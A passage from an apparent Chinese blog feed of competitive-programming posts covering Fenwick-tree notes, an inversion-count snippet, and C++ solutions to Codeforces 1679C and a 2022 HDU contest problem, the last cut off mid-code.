        <content type="html"><![CDATA[<p>来源于CF1676H2题目，遇到一个求逆序对的问题，咱也不敢问为什么能这么求啊。</p><span id="more"></span><h2 id="求逆序对"><a href="#求逆序对" class="headerlink" title="求逆序对"></a>求逆序对</h2><p>用途：给一个序列，求出逆序对，$O(log_2n)$</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t; cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> n,rez=<span class="number">0</span>;</span><br><span class="line">        cin&gt;&gt;n;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">a</span><span class="params">(n)</span>,<span class="title">T</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) cin&gt;&gt;a[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> x=a[i];x&gt;<span class="number">0</span>;x -= x&amp;-x) rez+=T[x];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> x=a[i];x&lt;=n;x+=x&amp;-x) T[x]+=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;rez&lt;&lt;<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 板子 </category>
          
          <category> 逆序对 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>树状数组学习笔记</title>
      <link href="/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>树状数组（Fenwick Tree），这次EC Final遇到过的，英文也记一下，也来学一下，刚好半夜刷题刷到了树状数组可以解决的题目！</p><span id="more"></span><!--sigma--><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>树状数组和线段树具有相似的功能，但他俩毕竟还有一些区别：树状数组能有的操作，线段树一定有；线段树有的操作，树状数组不一定有。但是树状数组的代码要比线段树短，思维更清晰，速度也更快，在解决一些单点修改的问题时，树状数组是不二之选。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>下面这张图展示了树状数组的工作原理：</p><p><img src="/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.svg" alt="1"></p><p>这个结构和线段树有些类似：用一个大节点表示一些小节点的信息，进行查询的时候只需要查询一些大节点而不是所有的小节点。</p><p>最上面的八个方块就代表数组 $a$。</p><p>他们下面的参差不齐的剩下的方块就代表数组 $a$ 的上级——$c$ 数组。</p><p>从图中可以看出：<br>$c_2$ 管理的是 $a_1$,$a_2$；<br>$c_4$ 管理的是 $a_1$,$a_2$,$a_3$,$a_4$；<br>$c_6$ 管理的是 $a_5$,$a_6$；$c_8$ 则管理全部 $8$ 个数。</p><p>如果要计算数组 $a$ 的区间和，比如说要算 $a_{51}$~$a_{91}$ 的区间和，可以采用类似倍增的思想：</p><p>从 $91$ 开始往前跳，发现 $c_n$（$n$ 我也不确定是多少，算起来太麻烦，就意思一下）只管 $a_{91}$ 这个点，那么你就会找 $a_{90}$，发现 $c_{n - 1}$ 管的是 $a_{90}$&amp;$a_{89}$；那么你就会直接跳到 $a_{88}$，$c_{n - 2}$ 就会管 $a_{81}$~$a_{88}$ 这些数，下次查询从 $a_{80}$ 往前找，以此类推。</p><h2 id="用法及操作"><a href="#用法及操作" class="headerlink" title="用法及操作"></a>用法及操作</h2><p>那么问题来了，怎么知道 $c_i$ 管理的数组 $a$ 中的哪个区间呢？<br>这时，我们引入一个函数——<code>lowbit</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// x 的二进制表示中，最低位的 1 的位置。</span></span><br><span class="line">  <span class="comment">// lowbit(0b10110000) == 0b00010000</span></span><br><span class="line">  <span class="comment">//          ~~~^~~~~</span></span><br><span class="line">  <span class="comment">// lowbit(0b11100100) == 0b00000100</span></span><br><span class="line">  <span class="comment">//          ~~~~~^~~</span></span><br><span class="line">  <span class="keyword">return</span> x &amp; -x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释说明了 <code>lowbit</code> 的意思，对于 $x=88$：$88_{(10)}=1011000_{(2)}$<br>发现第一个 $1$ 以及他后面的 $0$ 组成的二进制是 $1000$<br> $1000_{(2)} = 8_{(10)}$<br>$1000$ 对应的十进制是 $8$，所以 $c_{88}$ 一共管理 $8$ 个 $a$ 数组中的元素。</p><p>在常见的计算机中，有符号数采用补码表示。在补码表示下，数 <code>x</code> 的相反数 <code>-x = ~x + 1</code>。</p><p>使用 lowbit 函数，我们可以实现很多操作，例如单点修改，将 $a_x$ 加上 $k$，只需要更新 $a_x$ 的所有上级：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (x &lt;= n) &#123;  <span class="comment">// 不能越界</span></span><br><span class="line">    c[x] = c[x] + k;</span><br><span class="line">    x = x + <span class="built_in">lowbit</span>(x);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前缀求和：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getsum</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;  <span class="comment">// a[1]..a[x]的和</span></span><br><span class="line">  <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (x &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">    ans = ans + c[x];</span><br><span class="line">    x = x - <span class="built_in">lowbit</span>(x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="区间加-amp-区间求和"><a href="#区间加-amp-区间求和" class="headerlink" title="区间加 &amp; 区间求和"></a>区间加 &amp; 区间求和</h2><p>若维护序列 $a$ 的差分数组 $b$，此时我们对 $a$ 的一个前缀 $r$ 求和，即 $\sum_{i=1}^{r} a_i$，由差分数组定义得 $a_i=\sum_{j=1}^i b_j$</p><p>进行推导</p><p>$$<br>\begin{aligned}<br>&amp;\sum_{i=1}^{r} a_i\=&amp;\sum_{i=1}^r\sum_{j=1}^i b_j\=&amp;\sum_{i=1}^r b_i\times(r-i+1)<br>\=&amp;\sum_{i=1}^r b_i\times (r+1)-\sum_{i=1}^r b_i\times i<br>\end{aligned}<br>$$</p><p>区间和可以用两个前缀和相减得到，因此只需要用两个树状数组分别维护 $\sum b_i$ 和 $\sum i \times b_i$，就能实现区间求和。</p><p><img src="/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.svg"></p><p>代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="keyword">int</span> t1[MAXN], t2[MAXN], n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; <span class="keyword">return</span> x &amp; (-x); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1 = k * v;</span><br><span class="line">  <span class="keyword">while</span> (k &lt;= n) &#123;</span><br><span class="line">    t1[k] += v, t2[k] += v1;</span><br><span class="line">    k += <span class="built_in">lowbit</span>(k);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getsum</span><span class="params">(<span class="keyword">int</span> *t, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (k) &#123;</span><br><span class="line">    ret += t[k];</span><br><span class="line">    k -= <span class="built_in">lowbit</span>(k);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add1</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">add</span>(l, v), <span class="built_in">add</span>(r + <span class="number">1</span>, -v);  <span class="comment">// 将区间加差分为两个前缀加</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">getsum1</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (r + <span class="number">1ll</span>) * <span class="built_in">getsum</span>(t1, r) - <span class="number">1ll</span> * l * <span class="built_in">getsum</span>(t1, l - <span class="number">1</span>) -</span><br><span class="line">         (<span class="built_in">getsum</span>(t2, r) - <span class="built_in">getsum</span>(t2, l - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h2><p>$O(n)$ 建树：</p><p>每一个节点的值是由所有与自己直接相连的儿子的值求和得到的。因此可以倒着考虑贡献，即每次确定完儿子的值后，用自己的值更新自己的直接父亲。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="comment">// O(n)建树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">    t[i] += a[i];</span><br><span class="line">    <span class="keyword">int</span> j = i + <span class="built_in">lowbit</span>(i);</span><br><span class="line">    <span class="keyword">if</span> (j &lt;= n) t[j] += t[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="区间加法-amp-单点查询"><a href="#区间加法-amp-单点查询" class="headerlink" title="区间加法&amp;单点查询"></a>区间加法&amp;单点查询</h2><p>只要把我们原来维护的数组进行差分即可。这样的话我们原来 <code>get_sum(x)</code> 的操作就会变成查询 <code>x</code> 点的值 ，因为我们维护的是差分数组，所以在区间加法的时候我们只需要对端点修改即可，复杂度都是 $O(log_2n)$。</p><p>以上大部分内容来自 OI WIKI。</p><h2 id="例题：CF1679C"><a href="#例题：CF1679C" class="headerlink" title="例题：CF1679C"></a>例题：<a href="https://codeforces.com/problemset/problem/1679/C">CF1679C</a></h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" alt="3"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题题面比较长，但是出的确实比较好。大概就是说给你一张 $n \times n$ 的棋盘，然后给你 3 种类型的操作。</p><ol><li>在 $(x,y)$ 中放入一辆车，保证原位置没车</li><li>在 $(x,y)$ 中取出一辆车 ，保证原位置有车</li><li>选取一块矩形，由左上角端点坐标和右下角端点坐标描述。让你判断这个矩形区域内是否都在车的攻击范围内。</li></ol><p>那么你在没有看到 $n\times n$ 有范围限制就应该能想到了，这题肯定不能存储棋盘，而要描述车的位置。1，2操作我们可以堪称是单点修改，3操作可以看成是区间查询。那么想到这两点就能很好的想到树状数组了。我们把棋盘横竖分离，横坐标建一棵树状数组，纵坐标也建一棵树状数组，那么在插入 $(x,y)$ 的时候我们就可以对横坐标的 $x$ 位置进行单点修改，纵坐标的 $y$ 进行单点修改。其实哪种叫法无所谓，你只要对应上就可以了，不必纠结横纵坐标。那么再仔细解读一下它的第三个要求，判断是否能被车都撞到，那我们很容易想到，横坐标范围都有车或者纵坐标范围都有车，那这个区域都能被车撞到，就可以了，这个区间查询我们查横纵坐标，有一方满足即可。但是需要注意，我们要做一点修改，因为假如一行上面有两辆车，而上一行恰好没有车，那么这两行显然上面那一行不能被撞到，但是因为这两行区间查询得到 $2$ 我们可能误认为它能撞到这两行，那么这显然不符合逻辑。于是我们可以另外开一个数组记录这一行（列）上面车的数量，给树状数组增加的时候我只用保证这一行（列）之前没有车就行了，同样给树状数组减少的时候我们要确保这一行（列）都没车了，才能减少。这样我们就能愉快地 AC 这题了。</p><p>这个题目出的是真的好！</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> c[maxn],d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;-x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> val,<span class="keyword">int</span> *c)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(x&lt;=n)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,x,val);</span></span><br><span class="line">        c[x]+=val;</span><br><span class="line">        x+=<span class="built_in">lowbit</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_sum</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> *c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        ans+=c[x];</span><br><span class="line">        x-=<span class="built_in">lowbit</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> cnt1[maxn],cnt2[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;q);</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> t,x,y,x1,y1;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;t);</span><br><span class="line">        <span class="keyword">if</span>(t==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">            cnt1[x]++;</span><br><span class="line">            cnt2[y]++;</span><br><span class="line">            <span class="keyword">if</span>(cnt1[x]==<span class="number">1</span>)<span class="built_in">add</span>(x,<span class="number">1</span>,c);</span><br><span class="line">            <span class="keyword">if</span>(cnt2[y]==<span class="number">1</span>)<span class="built_in">add</span>(y,<span class="number">1</span>,d);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(t==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">            cnt1[x]--;</span><br><span class="line">            cnt2[y]--;</span><br><span class="line">            <span class="keyword">if</span>(!cnt1[x])<span class="built_in">add</span>(x,<span class="number">-1</span>,c);</span><br><span class="line">            <span class="keyword">if</span>(!cnt2[y])<span class="built_in">add</span>(y,<span class="number">-1</span>,d);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;x,&amp;y,&amp;x1,&amp;y1);</span><br><span class="line">            <span class="keyword">if</span>((<span class="built_in">get_sum</span>(x1,c)-<span class="built_in">get_sum</span>(x<span class="number">-1</span>,c))==(x1-x+<span class="number">1</span>)||(<span class="built_in">get_sum</span>(y1,d)-<span class="built_in">get_sum</span>(y<span class="number">-1</span>,d))==(y1-y+<span class="number">1</span>))&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>树状数组很后悔没有很早学起来，因为它真的比线段树简单太多了，可惜我是先会的线段树，所以导致就没兴趣学树状数组，不过没事，现在会了也是不迟的！</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 数据结构 </category>
          
          <category> 树状数组 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022“杭电杯”中国大学生算法设计超级联赛（4）题解</title>
      <link href="/2022/07/28/2022%E2%80%9C%E6%9D%AD%E7%94%B5%E6%9D%AF%E2%80%9D%E4%B8%AD%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E8%B6%85%E7%BA%A7%E8%81%94%E8%B5%9B%EF%BC%884%EF%BC%89%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/07/28/2022%E2%80%9C%E6%9D%AD%E7%94%B5%E6%9D%AF%E2%80%9D%E4%B8%AD%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E8%B6%85%E7%BA%A7%E8%81%94%E8%B5%9B%EF%BC%884%EF%BC%89%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>本场比赛写出一个 <code>1007</code> 也写一篇题解吧！</p><span id="more"></span><!--不知道她是否能答应，再等等吧！--><h2 id="1007"><a href="#1007" class="headerlink" title="1007"></a>1007</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/28/2022%E2%80%9C%E6%9D%AD%E7%94%B5%E6%9D%AF%E2%80%9D%E4%B8%AD%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E8%B6%85%E7%BA%A7%E8%81%94%E8%B5%9B%EF%BC%884%EF%BC%89%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是给你 $n$ 层楼，每层楼有一个怪物，杀了怪物需要自己的攻击力超过它的血量，否则不能到达该楼层，一次可以跳 $k$ 以内的层或者下降一层，杀了怪物后这一层不能继续呆了，杀了怪物之后怪物的血量会成为自己的攻击力。</p><p>看标程是线段树写的，咱也不会，只能纯模拟啦。</p><p>首先可以肯定的一点就是：你跳了之后要把下面的怪物都收拾完，因为题目问你的是：能否解决所有怪物！！而你一次只能下降一层，不能去已经没有怪物的楼层。因此我们主要关注，我们要跳到哪里去，能收拾完下面的怪物。首先可以肯定的是：直接选择能跳的跳是肯定不行的，随便出一组数据便可知。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">6 1 5</span><br><span class="line">6 1 1 2 1 4</span><br></pre></td></tr></table></figure><p>当你贪心地跳到第 $2$ 层之后你就会发现 $6$ 你收拾不了了。而这个数据是有解的，我们跳到第五层从上往下收拾完是能打过 $6$ 的。</p><p>那么其实我们就需要判断：我们跳了一个楼层之后是否能收拾下面的怪物，收拾下面的怪物是从上往下收拾，我们还可以沿途吃掉中间的怪物增长攻击力，但是这样的 <code>check</code> 乍一听好像是 <code>O(n)</code> 啊，不可行！但是其实我们可以把打不过的怪物堆起来，打得过的怪物直接扔掉，如果这次选择这层楼打不掉，那么我们选择更高的楼层去打。这样在整体的判断中，每个怪物只会被判一次，总时间复杂度能接受。</p><p>具体实现方式我们可以用栈，首先如果当前楼层我能打过我肯定直接打了，因为上一层比不上一层打肯定要好的，上了一层我还能多一个选择。那么如果当前打不过，我们就先压栈，循环k以内的数据，如果能打过，尝试过来打，并开始从栈中取出怪物来看看能否打过，能打过扔出来，打不过则继续往上走。那么不难发现，我们如果跳到了 $p$ 层，要判断能否结局 $p-i$ 层的怪物我们只需要把当前攻击力加上 $p-i+1——p$ 的怪物数值之和能否超过它的血量即可。那么这里算到和的话我们就可以前缀处理了。那么为什么不需要重复判断呢？因为我跳到这一层时，我都能打过这个怪物了，我跳到更高的层来打这个怪物会打不过？</p><p>如果说 $k$ 层遍历完了之后，我栈里面还有数据，说明我跳哪都打不完这些怪物，就放弃了。如果能跳 $p$ 层打过，我当前在 $q$ 层的话，那么我在解决完之后我身处 $q+1$ 层，中间 $q+1——p$ 层都是空楼层，都不能去，因此我们把自己放到 $p$ 层，但是同时可选择的范围要随着之前跳的高度减少。因为我原来在 $q+1$ 层本来也就只能跳到 $q+k$ 层嘛，这个应该很好理解。</p><p>那么看完这些之后，相信你不难理解下面的标程了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 